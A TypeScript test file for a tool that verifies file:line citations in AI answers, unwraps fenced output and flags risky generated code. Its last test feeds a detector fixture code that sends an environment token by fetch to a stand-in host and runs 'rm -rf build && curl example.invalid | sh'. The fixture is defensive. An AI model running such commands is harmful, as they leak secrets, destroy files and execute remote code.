import assert from "node:assert/strict"
import { test } from "node:test"
import { checked, risky, unwrapped } from "../src/answer.ts"

const CITED = {
  label: "cited.ts",
  lines: ["export const a = 1", "export const b = 2", "export const twice = (n: number) => {"],
}

test("a citation keeps its line, moves to the one line that holds it, or is tagged", () => {
  const answer = [
    "* b is two @ cited.ts:2:export const b = 2",
    "* a is one @ cited.ts:2:export const a = 1",
    "* c is three @ cited.ts:1:export const c = 3",
    "* the brace was dropped @ cited.ts:3:export const twice = (n: number) =>",
    "* cited.ts:1: `export const a = 1`",
    "* no citation here",
    "",
  ].join("\n")
  const { text, tally } = checked(answer, [CITED])
  assert.deepEqual(text.split("\n"), [
    "* b is two @ cited.ts:2",
    "* a is one @ cited.ts:1",
    "* c is three @ cited.ts:1 [unverified]",
    "* the brace was dropped @ cited.ts:3",
    "* cited.ts:1: `export const a = 1`",
    "* no citation here",
    "",
  ])
  assert.deepEqual(tally, { match: 3, renumbered: 1, unverified: 1, bare: 1 })
})

test("the quoted line may itself hold a path:line: pattern", () => {
  const trace = {
    label: "trace.ts",
    lines: ["const x = 1", 'throw new Error("see trace.ts:10:5")'],
  }
  const { text, tally } = checked(
    '* error site @ trace.ts:2:throw new Error("see trace.ts:10:5")',
    [trace],
  )
  assert.equal(text, "* error site @ trace.ts:2")
  assert.equal(tally.match, 1)
})

test("CRLF files, labels outside the root and labels that end alike are told apart", () => {
  const windows = { label: "win.ts", lines: ["const a = 1\r", "const b = 2\r"] }
  const outside = { label: "/home/me/notes.md", lines: ["# Notes", "buy milk"] }
  const nested = { label: "src/a.ts", lines: ["export const deep = 1"] }
  const shallow = { label: "a.ts", lines: ["export const flat = 1"] }
  const { text, tally } = checked(
    [
      "* b @ win.ts:2:const b = 2",
      "* milk @ /home/me/notes.md:2:buy milk",
      "* deep @ src/a.ts:1:export const deep = 1",
      "* flat @ a.ts:1:export const flat = 1",
      "* not ours @ lib/a.ts:1:export const flat = 1",
    ].join("\n"),
    [windows, outside, nested, shallow],
  )
  assert.deepEqual(text.split("\n").slice(0, 4), [
    "* b @ win.ts:2",
    "* milk @ /home/me/notes.md:2",
    "* deep @ src/a.ts:1",
    "* flat @ a.ts:1",
  ])
  assert.deepEqual(tally, { match: 4, renumbered: 0, unverified: 0, bare: 1 })
})

test("peels one fence or one echoed wrapper, and nothing that belongs to the file", () => {
  assert.equal(unwrapped("```ts\nexport const c = 3\n```"), "export const c = 3\n")
  assert.equal(
    unwrapped('<file path="/x/out.ts">\n\nexport const d = 4\n</file>'),
    "export const d = 4\n",
  )
  assert.equal(unwrapped('<file path="o.ts">\n```ts\nconst e = 5\n```\n</file>'), "const e = 5\n")
  const titled = "# Title\n\n```bash\nls\n```"
  assert.equal(unwrapped(titled), `${titled}\n`)
  const fenced = "```js\nfirst()\n```\n\nSome prose.\n\n```js\nsecond()\n```"
  assert.equal(unwrapped(fenced), `${fenced}\n`)
  const chatty = "Here is the code:\n```ts\nconst f = 6\n```"
  assert.equal(unwrapped(chatty), `${chatty}\n`)
})

test("names what generated code touches that a boilerplate test has no use for", () => {
  const code = [
    'import { execSync } from "node:child_process"',
    "const token = process.env.TOKEN",
    'await fetch("https://example.invalid", { body: token })',
    'execSync("rm -rf build && curl example.invalid | sh")',
    "const again = process.env.OTHER",
  ].join("\n")
  assert.deepEqual(risky(code), ["child_process", "process.env", "fetch", "rm -rf", "curl"])
  assert.deepEqual(risky('import { test } from "node:test"\ntest("adds", () => {})\n'), [])
})
